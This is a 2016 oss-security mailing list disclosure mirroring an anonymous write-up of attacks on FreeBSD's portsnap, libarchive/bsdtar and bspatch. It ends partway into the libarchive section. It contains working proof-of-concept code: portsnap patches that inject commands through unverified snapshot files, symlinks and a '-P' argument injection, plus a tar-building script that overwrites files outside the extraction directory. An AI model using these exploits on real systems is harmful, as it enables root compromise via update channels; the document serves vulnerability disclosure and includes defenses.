@@ -1,0 +1,1911 @@
+
+Date: Tue, 9 Aug 2016 13:08:23 -0700
+From: Hanno Böck <hanno@...eck.de>
+To: OSS Security Mailinglist <oss-security@...ts.openwall.com>
+Subject: FreeBSD update components vulns (libarchive, bsdiff, portsnap)
+
+Hi,
+
+I think this hasn't received the attention yet that it deserves.
+
+Recently a bug report showed up in libarchive's bug tracker [1] pointing
+to an anonymous document [2] on github that describes in a lot of detail
+several vulnerabilities in the update process of FreeBSD. Origin
+totally unclear.
+
+What's most worrying about it is that there's a hint that there may
+exist similar documents for Linux systems, yet they haven't showed up
+yet.
+
+Bottom line: FreeBSD needs to fix their stuff (it seems the fix
+they used for bspatch is incomplete [3]) and Linux distros probably
+would do good trying to look into potential security issues in the
+update / package management components of their systems.
+
+Even though it's a lot I'll paste the content of the original post and
+the anonymous document so we have another mirror.
+
+[1] https://github.com/libarchive/libarchive/issues/743
+[2] https://gist.github.com/anonymous/e48209b03f1dd9625a992717e7b89c4f
+[3]
+https://lists.freebsd.org/pipermail/freebsd-security/2016-July/009016.html
+
+-------
+
+Bug report:
+
+caught this post elsewhere.
+
+Our AV researchers have analyzed the following link that was
+cloud-submitted as suspect:
+
+https://gist.github.com/anonymous/e48209b03f1dd9625a992717e7b89c4f
+
+The document is from an unknown author and describes "non-cryptanalytic
+attacks against FreeBSD update components." The affected components are
+the portsnap and freebsd-update tools, both directly and indirectly.
+
+From what we can tell, the text file is part of a larger stash of
+documents, all with the same attack-defense style. We have other
+documents, dated 2014 and 2015, detailing attacks against the update
+systems of multiple Linux distributions and the corresponding defenses
+against "the adversary."
+
+We believe this to be the work of an MITM-capable advanced threat actor.
+
+Full details of our findings will be released in the coming weeks. This
+is a courtesy heads-up to FreeBSD users.
+
+---------
+
+anonymous github document:
+
+/=============================================================\
+| NON-CRYPTANALYTIC ATTACKS AGAINST FREEBSD UPDATE COMPONENTS |
+\=============================================================/ 
+
+1. portsnap
+2. libarchive/bsdtar
+3. bspatch
+
+/==========\
+| PORTSNAP |
+\==========/
+
+The portsnap(8) script depends on a cryptographic chain of trust based
+on SHA256 hashes, all of them anchored to an RSA public key (pub.ssl)
+with a trusted keyprint defined in /etc/portsnap.conf. Unfortunately,
+the initial snapshot tarball is not properly verified, allowing a
+resourceful attacker to escape the cryptographic chain of trust and
+compromise the system. 
+
+In the portsnap(8) script, the function fetch_snapshot() fetches the
+initial snapshot tarball and immediately extracts it without any hash
+verification. (Indeed, there is no hash with which to verify this
+tarball, for the hash in the tarball's filename is the hash of the
+tINDEX.new metadata file fetched earlier.) 
+
+Exploitation vectors follow from 
+
+    (i)  vulnerabilities in libarchive/bsdtar itself. These are the
+    subject of the second security report. The symlink attacks have an
+    obvious impact, allowing any file on the system to be overwritten,
+    paving the way for immediate command execution. The hard-link
+    attacks, typically being restricted to /var because of filesystem
+    segmentation, can target /var/run/ld-elf.so.hints.   
+         
+    (ii) the attacker's ability to smuggle in unexpected tarball
+    contents. At first glance, it appears that fetch_snapshot()
+    verifies, with two calls to the function fetch_snapshot_verify(),
+    the contents of the tarball that _should_ be there; however,
+    nothing is done about the contents of the tarball that _should not_
+    be there. 
+This first report considers only the second class of vectors.
+
+Exploitation vector #1:  fetch_snapshot_verify() error
+------------------------------------------------------
+
+The function fetch_snapshot_verify() contains the following hash check:
+
+    if [ "`gunzip -c snap/${F} | ${SHA256} -q`" != ${F} ]; then
+
+The problem is that ${F} expands to a file hash without any .gz suffix.
+As documented in the gunzip(1) manual page, gunzip(1) will first try
+opening the file snap/${F}. Failing that, it will automatically append
+a suffix and try opening the file snap/${F}.gz.
+
+An attacker can supply both snap/${F} and snap/{F}.gz, where the first
+file is clean and passes the hash check and the second file is
+malicious. Because the portsnap(8) script explicitly appends a .gz
+suffix for every other use of gunzip(1), the attacker's malicious file
+will be the one chosen for extraction.
+
+Exploitation vector #1: defense
+-------------------------------
+
+A band-aid solution for this vector is to add the .gz extension:
+
+    if [ "`gunzip -c snap/${F}.gz | ${SHA256} -q`" != ${F} ]; then
+
+Exploitation vector #2: file prediction
+---------------------------------------
+
+An attacker can smuggle in files that will be used in later portsnap(8)
+runs. When fetching new files based on differences in tINDEX/tINDEX.new
+and INDEX/INDEX.new, the functions fetch_make_patchlist() and
+fetch_update() will request new files only if they do not already exist
+in /var/db/portsnap/files. If they do already exist (because an
+attacker has provided them), they will not be overwritten and will not
+be subject to hash verification.
+
+This is all well and good, but it would seem that an attacker faces the 
+difficult task of guessing future SHA256 hashes. Fortunately for the
+attacker, there is usually an asynchrony on the portsnap servers
+between the snapshop tag (snapshot.ssl) and the update tag
+(latest.ssl). An initialization run of portsnap(8) will, via the
+function fetch_run(), grab the snapshot tarball, handle it, and then
+automatically check for an available update. All the attacker has to do
+is ensure the tarball contains the malicious file snap/X.gz, where X is
+a hash learned from the already available update on the server. 
+
+Exploitation vector #2: defense
+-------------------------------
+
+All four demonstration attacks given below would be foiled if the
+snapshot tarball were to be cryptographically verified, perhaps via a
+hash added to the snapshot tag. This would also provide protection for
+libarchive/bsdtar, the attack surface of which has barely been
+scratched in the second security report, with only filesystem-based
+attacks investigated. At ~100K lines of code with auto-detected
+multi-format support, libarchive/bsdtar is far too dangerous to trust
+with pre-verification root privileges.
+
+The more general problem is that portsnap(8), along with
+freebsd-update(8), contains more pre-verification processing than
+strictly necessary. Hashes are checked _after_ running gunzip(1),
+bspatch(1), and various character-stream utilities rather than
+_before_, leading to problems such as the bspatch(1) memory-corruption
+attack in the third security report. Contrast this with the ports
+system proper, which guards virtually all processing with the
+'checksum' target.
+
+Attack demonstrations
+---------------------
+
+Attack #1 is an example attack using exploitation vector #1. It
+achieves arbitrary command execution when the ports system is next used
+after an initialization run of `portsnap fetch extract`.
+
+Attack #2 is an example attack using exploitation vector #2. It achieves
+arbitrary command execution when the ports system is next used after an 
+initialization run of `portsnap fetch extract`.
+
+Attacks #3 and #4 are example attacks using exploitation vector #2.
+They achieve immediate arbitrary command execution during an
+initialization run of `portsnap fetch extract`.
+
+These attacks are purely for demonstration purposes, so no effort has
+been made to make them stealthy. Attacks #3 and #4 in particular are
+very noisy and do not bother extracting a full ports tree. 
+
+The following patch can be applied to /usr/sbin/portsnap. The modified
+script allows convenient simulation of actual attacks. Simulation means
+that the modified script does not "cheat" -- a corrupt snapshot could
+achieve the same effects outside the cryptographic chain of trust. Full
+descriptions of the individual attacks appear afterward.
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+@@ -654,6 +654,95 @@
+ 	return 0
+ }
+ 
++attack_one() {
++
++    evilcmds='EVILCMDS != /usr/bin/touch /tmp/evil_file_1; echo x'
++
++    snapshot=`cut -f3 -d'|' tag.new`.tgz
++    index=`look INDEX tINDEX.new | cut -f2 -d'|'`
++    tar -xz --numeric-owner -f "$snapshot" snap/
++    mk=`zgrep '^Mk/bsd\.commands\.mk' "snap/$index.gz" | cut -f2 -d
+'|'`
++    tar -xzf "snap/$mk.gz"
++    echo "$evilcmds" >> Mk/bsd.commands.mk
++    mv "snap/$mk.gz" "snap/$mk"
++    tar -czf "snap/$mk.gz" Mk/bsd.commands.mk
++    rm -f "$snapshot"  
++    tar -czf "$snapshot" snap/
++    rm -rf snap Mk
++}
++
++attack_two() {
++
++    evilcmds='EVILCMDS != /usr/bin/touch /tmp/evil_file_2; echo x'
++
++    indexold=`look INDEX tINDEX | cut -f2 -d'|'`
++    indexnew=`look INDEX tINDEX.new | cut -f2 -d'|'`
++    mk=`zgrep '^Mk/bsd\.commands\.mk' "files/$indexold.gz" | cut -f2
+-d '|'`
++    tar -xzf "files/$mk.gz"
++    echo "$evilcmds" >> Mk/bsd.commands.mk
++    tar -czf x.gz Mk/bsd.commands.mk
++    bcmhash=`gunzip -c x.gz | sha256`
++    mv x.gz "files/$bcmhash.gz"
++    (zcat "files/$indexold.gz"; echo "Mk/bsd.commands.mk|$bcmhash") | 
++        gzip > "files/$indexnew.gz"
++    rm -rf Mk
++}
++
++attack_three() {
++
++    evilcmds='/usr/bin/touch /tmp/evil_file_3'
++
++    cp /usr/bin/cut /tmp/cut.saved3
++    echo "/usr/bin/cut saved to /tmp/cut.saved3"
++    indexnew=`look INDEX tINDEX.new | cut -f2 -d'|'`
++    cmdsfile=/var/db/portsnap/files/evilcmds.sh
++    cmdshash=`jot -s "" -b "a" 64`
++    symfile=.portsnap.INDEX
++    symhash=`jot -s "" -b "f" 64`
++    cat > "files/$indexnew" << EOF
++$cmdsfile|$cmdshash
++$symfile|$symhash
++EOF
++    gzip "files/$indexnew"
++    cat > "$cmdsfile" << EOF
++#!/bin/sh
++$evilcmds
++EOF
++    chmod 777 "$cmdsfile"
++    touch "files/$cmdshash"
++    gzip "files/$cmdshash"
++    ln -s /usr/bin/cut "$symfile"
++    tar -czf "files/$symhash.gz" "$symfile"
++    rm -f "$symfile"
++}
++
++attack_four() {
++    evilcmds='/usr/bin/touch /tmp/evil_file_4'
++
++    cp /usr/bin/cut /tmp/cut.saved4
++    echo "/usr/bin/cut saved to /tmp/cut.saved4"
++    indexnew=`look INDEX tINDEX.new | cut -f2 -d'|'`
++    symfile=sym
++    symhash=`jot -s "" -b "a" 64`
++    cmdshash=`jot -s "" -b "f" 64`
++    cat > "files/$indexnew" << EOF
++$symfile|$symhash
++-P|$cmdshash
++EOF
++    gzip "files/$indexnew"
++    ln -s /usr/bin "$symfile"
++    tar -czf "files/$symhash.gz" "$symfile"
++    rm -f "$symfile"
++    mkdir "$symfile"
++    cat > "$symfile/cut" << EOF
++#!/bin/sh
++$evilcmds
++EOF
++    chmod 777 "$symfile/cut"
++    tar -czf "files/$cmdshash.gz" "$symfile/cut"
++    rm -r "$symfile"
++}
++
+ # Fetch a snapshot tarball, extract, and verify.
+ fetch_snapshot() {
+ 	while ! fetch_tag snapshot; do
+@@ -671,6 +760,8 @@
+ 	echo "Fetching snapshot generated at `date -r
+${SNAPSHOTDATE}`:" fetch -r http://${SERVERNAME}/s/${SNAPSHOTHASH}.tgz
+|| return 1 
++	[ "$ATTACK" = "one" ] && attack_one
++
+ 	echo -n "Extracting snapshot... "
+ 	tar -xz --numeric-owner -f ${SNAPSHOTHASH}.tgz snap/ || return
+1 rm ${SNAPSHOTHASH}.tgz
+@@ -714,6 +805,10 @@
+ 	fetch_metadata || return 1
+ 	fetch_metadata_sanity || return 1
+ 
++	[ "$ATTACK" = "two" ] && attack_two
++	[ "$ATTACK" = "three" ] && attack_three
++	[ "$ATTACK" = "four" ] && attack_four
++
+ 	echo -n "Updating from `date -r ${OLDSNAPSHOTDATE}` "
+ 	echo "to `date -r ${SNAPSHOTDATE}`."
+ 
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+Attack #1
+---------
+
+Directories /usr/ports and /var/db/portsnap are cleaned.
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+attack_one() {
+
+    evilcmds='EVILCMDS != /usr/bin/touch /tmp/evil_file_1; echo x'
+
+    snapshot=`cut -f3 -d'|' tag.new`.tgz
+    index=`look INDEX tINDEX.new | cut -f2 -d'|'`
+    tar -xz --numeric-owner -f "$snapshot" snap/
+    mk=`zgrep '^Mk/bsd\.commands\.mk' "snap/$index.gz" | cut -f2 -d '|'`
+    tar -xzf "snap/$mk.gz"
+    echo "$evilcmds" >> Mk/bsd.commands.mk
+    mv "snap/$mk.gz" "snap/$mk"
+    tar -czf "snap/$mk.gz" Mk/bsd.commands.mk
+    rm -f "$snapshot"  
+    tar -czf "$snapshot" snap/
+    rm -rf snap Mk
+}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+This attack simulates the delivery of a corrupt snapshot tarball
+including two files:
+
+    snap/$mk
+    snap/$mk.gz
+    
+where snap/$mk contains a clean Mk/bsd.commands.mk and is used to pass
+    hash verification but where snap/$mk.gz contains a custom
+    Mk/bsd.commands.mk and is used for extraction. 
+
+Mk/bsd.commands.mk is a file that is not updated often, so
+modifications will not be overwritten, and it is unconditionally
+included in Mk/bsd.port.mk, so commands inside it will be run when
+using the ports system. 
+# ATTACK=one portsnap fetch
+[...]
+# portsnap extract
+[...]
+# tail -n 1 /usr/ports/Mk/bsd.commands.mk 
+EVILCMDS != /usr/bin/touch /tmp/evil_file_1; echo x
+# cd /usr/ports/[...]/[...]
+# ls /tmp/evil_file_1
+ls: /tmp/evil_file_1: No such file or directory
+# make fetch
+[...]
+# ls /tmp/evil_file_1
+/tmp/evil_file_1
+
+Attack #2
+---------
+
+Directories /usr/ports and /var/db/portsnap are cleaned. 
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+attack_two() {
+
+    evilcmds='EVILCMDS != /usr/bin/touch /tmp/evil_file_2; echo x'
+
+    indexold=`look INDEX tINDEX | cut -f2 -d'|'`
+    indexnew=`look INDEX tINDEX.new | cut -f2 -d'|'`
+    mk=`zgrep '^Mk/bsd\.commands\.mk' "files/$indexold.gz" | cut -f2 -d
+    '|'` tar -xzf "files/$mk.gz"
+    echo "$evilcmds" >> Mk/bsd.commands.mk
+    tar -czf x.gz Mk/bsd.commands.mk
+    bcmhash=`gunzip -c x.gz | sha256`
+    mv x.gz "files/$bcmhash.gz"
+    (zcat "files/$indexold.gz"; echo "Mk/bsd.commands.mk|$bcmhash") | 
+        gzip > "files/$indexnew.gz"
+    rm -rf Mk
+}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+This attack simulates the delivery of a corrupt snapshot tarball
+including two malicious files:
+
+    snap/$bcmhash.gz
+    snap/$indexnew.gz
+
+where snap/$bcmhash.gz contains a custom Mk/bsd.commands.mk and where 
+snap/$indexnew.gz contains an update INDEX. (Note that the script peeks
+inside tINDEX.new for the update INDEX hash, which is not "cheating,"
+for an attacker can learn the same information from the update metadata
+available on the server, assuming an update is available, which is
+typically the case.)
+
+The update INDEX is an otherwise sane INDEX file with the following
+line appended:
+
+    Mk/bsd.commands.mk|$bcmhash
+    
+When portsnap(8) discovers that the update INDEX already exists on the 
+filesystem, this file will not be overwritten and will not be
+    hash-verified. 
+
+# ATTACK=two portsnap fetch
+[...]
+# portsnap extract
+[...]
+# tail -n 1 /usr/ports/Mk/bsd.commands.mk 
+EVILCMDS != /usr/bin/touch /tmp/evil_file_2; echo x
+# cd /usr/ports/[...]/[...]
+# ls /tmp/evil_file_2
+ls: /tmp/evil_file_2: No such file or directory
+# make fetch
+[...]
+# ls /tmp/evil_file_2
+/tmp/evil_file_2
+
+Attack #3
+---------
+
+Directories /usr/ports and /var/db/portsnap are cleaned. 
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+attack_three() {
+
+    evilcmds='/usr/bin/touch /tmp/evil_file_3'
+
+    cp /usr/bin/cut /tmp/cut.saved3
+    echo "/usr/bin/cut saved to /tmp/cut.saved3"
+    indexnew=`look INDEX tINDEX.new | cut -f2 -d'|'`
+    cmdsfile=/var/db/portsnap/files/evilcmds.sh
+    cmdshash=`jot -s "" -b "a" 64`
+    symfile=.portsnap.INDEX
+    symhash=`jot -s "" -b "f" 64`
+    cat > "files/$indexnew" << EOF
+$cmdsfile|$cmdshash
+$symfile|$symhash
+EOF
+    gzip "files/$indexnew"
+    cat > "$cmdsfile" << EOF
+#!/bin/sh
+$evilcmds
+EOF
+    chmod 777 "$cmdsfile"
+    touch "files/$cmdshash"
+    gzip "files/$cmdshash"
+    ln -s /usr/bin/cut "$symfile"
+    tar -czf "files/$symhash.gz" "$symfile"
+    rm -f "$symfile"
+}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+This attack simulates the delivery of a corrupt snapshot tarball
+including four malicious files:
+
+    snap/$indexnew.gz
+    snap/evilcmds.sh
+    snap/$cmdshash.gz
+    snap/$symhash.gz
+
+where snap/$indexnew.gz contains an update INDEX, where
+snap/evilcmds.sh is a shell script containing arbitrary commands, where
+snap/$cmdshash.gz is a dummy file for snap/evilcmds.sh, and where
+snap/$symhash.gz contains the symlink .portsnap.INDEX -> /usr/bin/cut.
+
+The update INDEX is the following:
+
+    /var/db/portsnap/files/evilcmds.sh|aaa[...]aaa
+    .portsnap.INDEX|fff[...]fff
+
+The idea is to use a symlink to break out of /usr/ports. Although
+tar(1), when operating as intended without special switches, refuses to
+extract _through_ symlinks, it will happily _extract_ symlinks pointing
+anywhere on the system, allowing another utility to cause damage
+_through_ those symlinks. Observe the following lines in the
+portsnap(8) script:     
+
+    extract_metadata() {
+        if [ -z "${REFUSE}" ]; then
+            sort ${WORKDIR}/INDEX > ${PORTSDIR}/.portsnap.INDEX
+
+During extraction, .portsnap.INDEX will become a symlink pointing to 
+/usr/bin/cut. The lines above will cause /usr/bin/cut to be overwritten
+with our sorted update INDEX. In other words, /usr/bin/cut will contain
+the following:
+
+    .portsnap.INDEX|fff[...]fff
+    /var/db/portsnap/files/evilcmds.sh|aaa[...]aaa
+    
+/usr/bin/cut will be executed in extract_indices(). The kernel will
+    reject the new /usr/bin/cut for execution, but the shell will
+    notice the failed execution and try running /usr/bin/cut as a shell
+    script. The pipe characters will be interpreted as command
+    delimiters. Hence we have achieved execution
+    of /var/db/portsnap/files/evilcmds.sh (the three other "commands"
+    will fail, of course).
+
+/tmp/cut.saved3 is a copy of the original /usr/bin/cut.
+
+# ATTACK=three portsnap fetch
+[...]
+# ls /tmp/evil_file_3
+ls: /tmp/evil_file_3: No such file or directory
+# portsnap extract
+[...]
+# ls /tmp/evil_file_3
+/tmp/evil_file_3
+# cat /usr/bin/cut
+.portsnap.INDEX|fff[...]fff
+/var/db/portsnap/files/evilcmds.sh|aaa[...]aaa
+# mv /tmp/cut.saved3 /usr/bin/cut
+
+Attack #4
+---------
+
+Directories /usr/ports and /var/db/portsnap are cleaned. 
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+attack_four() {
+    evilcmds='/usr/bin/touch /tmp/evil_file_4'
+
+    cp /usr/bin/cut /tmp/cut.saved4
+    echo "/usr/bin/cut saved to /tmp/cut.saved4"
+    indexnew=`look INDEX tINDEX.new | cut -f2 -d'|'`
+    symfile=sym
+    symhash=`jot -s "" -b "a" 64`
+    cmdshash=`jot -s "" -b "f" 64`
+    cat > "files/$indexnew" << EOF
+$symfile|$symhash
+-P|$cmdshash
+EOF
+    gzip "files/$indexnew"
+    ln -s /usr/bin "$symfile"
+    tar -czf "files/$symhash.gz" "$symfile"
+    rm -f "$symfile"
+    mkdir "$symfile"
+    cat > "$symfile/cut" << EOF
+#!/bin/sh
+$evilcmds
+EOF
+    chmod 777 "$symfile/cut"
+    tar -czf "files/$cmdshash.gz" "$symfile/cut"
+    rm -r "$symfile"
+}
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+This attack simulates the delivery of a corrupt snapshot tarball
+including three malicious files:
+
+    snap/$indexnew.gz
+    snap/$symhash.gz
+    snap/$cmdshash.gz
+
+where snap/$indexnew.gz contains an update INDEX, where
+snap/$symhash.gz contains the symlink sym -> /usr/bin, and where
+snap/$cmdshash.gz contains the shell script sym/cut.
+ 
+The update INDEX is the following:
+
+    sym|aaa[...]aaa
+    -P|fff[...]fff
+
+As in attack #3, the idea is to use a symlink to break out
+of /usr/ports and overwrite /usr/bin/cut, only this time we simplify
+the attack with a tar(1) -P switch injection to disable the usual
+symlink checks. Observe the following lines in the portsnap(8) script:
+     
+    extract_run() {
+        [...]
+        rm -f ${PORTSDIR}/${FILE}
+        tar -xz --numeric-owner -f ${WORKDIR}/files/${HASH}.gz \
+            -C ${PORTSDIR} ${FILE}
+              
+After the symlink sym -> /usr/bin has been extracted, the shell script
+sym/cut will be extracted through that symlink,
+overwriting /usr/bin/cut. The tar(1) symlink checks are bypassed
+because ${FILE} expands to the -P switch. 
+/tmp/cut.saved4 is a copy of the original /usr/bin/cut.
+
+# ATTACK=four portsnap fetch
+[...]
+# ls /tmp/evil_file_4
+ls: /tmp/evil_file_4: No such file or directory
+# portsnap extract
+[...]
+# ls /tmp/evil_file_4
+/tmp/evil_file_4
+# cat /usr/bin/cut
+#!/bin/sh
+/usr/bin/touch /tmp/evil_file_4
+# mv /tmp/cut.saved4 /usr/bin/cut
+
+/===================\
+| LIBARCHIVE/BSDTAR |
+\===================/
+
+The non-HEAD branches of FreeBSD still use libarchive/bsdtar 3.1.2 in
+base, released in Feb 2013. The next version, 3.2.0, was released
+recently (May 2016) and added to both the HEAD branch and ports.  
+
+Unless invoked with the -P switch, bsdtar tries to prevent three
+classes of filesystem attacks:
+
+    (1) absolute paths
+            - handled by bsdtar itself via edit_pathname() in tar/util.c
+            - not handled by bsdcpio until upstream commit 5935715 (Mar
+    2015), addressing CVE-2015-2304 (nothing more will be said about 
+              bsdcpio in this report, but note that FreeBSD non-HEAD is
+    still vulnerable to this particular bug)
+              
+    (2) dot-dot paths
+            - handled by libarchive via cleanup_pathname() in 
+              libarchive/archive_write_disk_posix.c
+    
+    (3) extraction through symlinks
+            - handled by libarchive via check_symlinks() in
+              libarchive/archive_write_disk_posix.c
+
+Three vulnerabilities exist in check_symlinks(). One of these, allowing
+a file overwrite outside the extraction directory, was discovered
+independently and has already been silently fixed upstream, though
+FreeBSD non-HEAD is still vulnerable. The other two vulnerabilities --
+one allowing a file overwrite outside the extraction directory and the
+other allowing permission changes to a directory outside the extraction
+directory -- are new and exist in both FreeBSD and upstream source.
+
+A fourth vulnerability, also new and existing in both FreeBSD and
+upstream source, arises from the fact that link-target pathnames are
+not subjected to the security checks listed above. This, combined with
+the fact that libarchive supports the POSIX feature of hard links with
+data payloads, allows a file overwrite outside the extraction directory
+(under hard-linking constraints).   
+
+The vulnerability matrix summarizing the above information is as
+follows: 
+
+            | non-HEAD (3.1.2) | HEAD/ports (3.2.0) | latest upstream
+    ----------------------------------------------------------------- 
+    bsdcpio |        Y         |          N         |        N
+    vuln #1 |        Y         |          N         |        N 
+    vuln #2 |        Y         |          Y         |        Y
+    vuln #3 |        Y         |          Y         |        Y
+    vuln #4 |        Y         |          Y         |        Y
+
+                    (Y = vulnerable, N = not vulnerable)
+
+Earlier versions may also be vulnerable.
+
+VULNERABILITY #1
+----------------
+
+{Affects} 
+
+3.1.2 (FreeBSD non-HEAD), possibly earlier
+
+{Description}
+ 
+check_symlinks() checks only the first pathname component for symlinks.
+In the pathname
+
+    dir1/dir2/file
+    
+check_symlinks() will ensure that 'dir1' is not a symlink, and in most
+    cases, 'file' will fortuitously still be unlinked elsewhere in
+    libarchive if it is a symlink, but 'dir2' will not be checked.
+
+{Demonstration}
+
+libarchive correctly catches this:
+
+$ echo hello > /tmp/myfile
+$ ln -s /tmp dir1
+$ tar cf x.tar dir1
+$ rm dir1
+$ mkdir dir1
+$ echo goodbye > dir1/myfile
+$ touch clear_safe_cache
+$ tar rf x.tar clear_safe_cache dir1/myfile 
+$ rm -r clear_safe_cache dir1
+$ ls
+x.tar
+$ tar tf x.tar 
+dir1
+clear_safe_cache
+dir1/myfile
+$ tar xvf x.tar 
+x dir1
+x clear_safe_cache
+x dir1/myfile: Cannot extract through symlink dir1
+tar: Error exit delayed from previous errors.
+$ cat /tmp/myfile 
+hello
+
+But libarchive fails to catch this:
+
+$ rm *
+$ mkdir dir1
+$ ln -s /tmp dir1/dir2
+$ tar cf x.tar dir1/dir2
+$ rm -r dir1
+$ mkdir -p dir1/dir2
+$ echo goodbye > dir1/dir2/myfile
+$ touch clear_safe_cache
+$ tar rf x.tar clear_safe_cache dir1/dir2/myfile 
+$ rm -r clear_safe_cache dir1
+$ ls
+x.tar
+$ tar tf x.tar 
+dir1/dir2
+clear_safe_cache
+dir1/dir2/myfile
+$ tar xvf x.tar
+x dir1/dir2
+x clear_safe_cache
+x dir1/dir2/myfile
+$ cat /tmp/myfile 
+goodbye
+
+{Defense}
+
+This was independently discovered and silently fixed in upstream commit 
+6a7b8ad (Jan 2016). There was no associated version bump, CVE ID, or
+vuln report, so it is unclear whether the security impact was
+recognized. The fix is included in the recent 3.2.0 release, but it is
+not mentioned in the "Security Fixes" section of the release notes. 
+
+VULNERABILITY #2
+----------------
+
+{Affects} 
+
+3.2.0 (FreeBSD HEAD/ports), 3.1.2 (FreeBSD non-HEAD), possibly earlier
+
+{Description}
+
+When check_symlinks() fails on an lstat() call, it checks errno for only
+ENOENT:
+
+    r = lstat(a->name, &st);
+    if (r != 0) {
+        /* We've hit a dir that doesn't exist; stop now. */
+        if (errno == ENOENT)
+            break;
+    }
+    
+All other error conditions get a free pass. In particular, ENAMETOOLONG
+    gets a free pass. This is by design: The function
+    _archive_write_disk_header() calls edit_deep_directories() after
+    check_symlinks() in an effort to accommodate deep directories.
+    Unfortunately, the interaction between the symlink checks and the
+    deep-directory support introduces a security vulnerability, in that
+    the symlink checks are effectively disabled for long pathnames.
+
+{Demonstration}
+
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+#!/bin/sh
+
+ELEMENT_LEN=200
+ELEMENT_NUM=6
+ELEMENT_STR=`jot -s "" -b "D" $ELEMENT_LEN`
+
+currdir=`pwd`
+
+exec < "$2"
+
+i=0
+while [ $i -lt $ELEMENT_NUM ]; do
+    mkdir $ELEMENT_STR
+    cd $ELEMENT_STR
+    i=$(($i + 1))
+done
+
+ln -s / slink
+tar cf "$currdir/x.tar" -C "$currdir" $ELEMENT_STR 
+rm -f slink
+mkdir -p "slink/`dirname "$1"`"
+cat - > "slink/$1"
+tar rf "$currdir/x.tar" -C "$currdir" $ELEMENT_STR 
+cd "$currdir"
+rm -rf $ELEMENT_STR
+%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
+
+$ cat /tmp/myfile
+cat: /tmp/myfile: No such file or directory
+$ echo this is the data I want > data
+$ ./vuln2.sh /tmp/myfile data
+$ ls
+data            vuln2.sh        x.tar
+$ tar xf x.tar
+[error messages omitted]
+$ cat /tmp/myfile 
+this is the data I want
+$ rm -r D* data x.tar
+$ echo overwrite existing file > data
+$ ./vuln2.sh /tmp/myfile data
+$ tar xf x.tar
+[error messages omitted]
+$ cat /tmp/myfile 
+overwrite existing file
+
+{Defense}
+
+The best solution is probably to excise the function
+edit_deep_directories() altogether and then change check_symlinks() to
+return ARCHIVE_FAILED when lstat() fails with errno other than ENOENT.
+It does not appear to be worth the trouble trying to work around
+PATH_MAX. Incidentally, POSIX defines PATH_MAX to include the
+terminating NUL, so if edit_deep_directories() is to remain, its two
+strlen() checks should be fixed accordingly: < PATH_MAX and >= PATH_MAX.
+
+VULNERABILITY #3
+----------------
+
+{Affects} 
+
+3.2.0 (FreeBSD HEAD/ports), 3.1.2 (FreeBSD non-HEAD), possibly earlier
+
+{Description}
+
+check_symlinks() employs a single-bin safety cache as an optimization.
+The idea is that after checking the pathname
+
+    aaa/bbb/ccc
+    
+for symlinks, if the next pathname is
+
+    aaa/bbb/ddd
+    
+there is no need to recheck aaa/bbb for symlinks. Unfortunately, a
+    cached aaa/bbb/ccc (where the directories are included for
+    illustration purposes -- simple filenames also work) allows symlink
+    checks to be bypassed if the next entry's pathname is one of
+    
+    a
+    aa
+    aaa
+    aaa/b
+    aaa/bb
+    aaa/bbb
+    aaa/bbb/c
+    aaa/bbb/cc
+    aaa/bbb/ccc    
+
+The functions restore_entry() and create_filesystem_object() in
+libarchive/archive_write_disk_posix.c appear to constrain the impact of
+this vulnerability on FreeBSD to permission changes on arbitrary
+directories. The root user is affected in default operation, whereas
+normal users may need to issue the -p switch (distinct from the -P
+switch) to be affected:
+
+$ mkdir /tmp/mydir
+$ ls -ld /tmp/mydir
+drwxr-xr-x  [...]
+$ ln -s /tmp/mydir sym
+$ tar cf x.tar sym
+$ rm sym
+$ mkdir sym
+$ chmod 777 sym
+$ tar rf x.tar sym
+$ rmdir sym
+$ tar tf x.tar 
+sym
+sym/
+$ tar xf x.tar 
+$ ls -ld /tmp/mydir
+drwxr-xr-x  [...]
+$ ls
+sym     x.tar
+$ rm sym
+$ tar xf x.tar -p
+$ ls -ld /tmp/mydir
+drwxrwxrwx  [...]
+$ rm -r /tmp/mydir *
+         
+As the root user:
+         
+# mkdir /tmp/mydir
+# ls -ld /tmp/mydir
+drwxr-xr-x  [...]
+# ln -s /tmp/mydir sym
+# tar cf x.tar sym
+# rm sym
+# mkdir sym
+# chmod 777 sym
+# tar rf x.tar sym
+# rmdir sym
+# tar tf x.tar
+sym
+sym/
+# tar xf x.tar
+# ls -ld /tmp/mydir
+drwxrwxrwx  [...]
+
+{Defense}
+
+This vulnerability subverts the assurances of check_symlinks(), so a
+fix should be local to check_symlinks(). It might also be worth
+investigating whether the performance gains of the safety cache are
+worth the added complexity and hairiness in such a security-critical
+function. 
+
+VULNERABILITY #4
+----------------
+
+{Affects} 
+
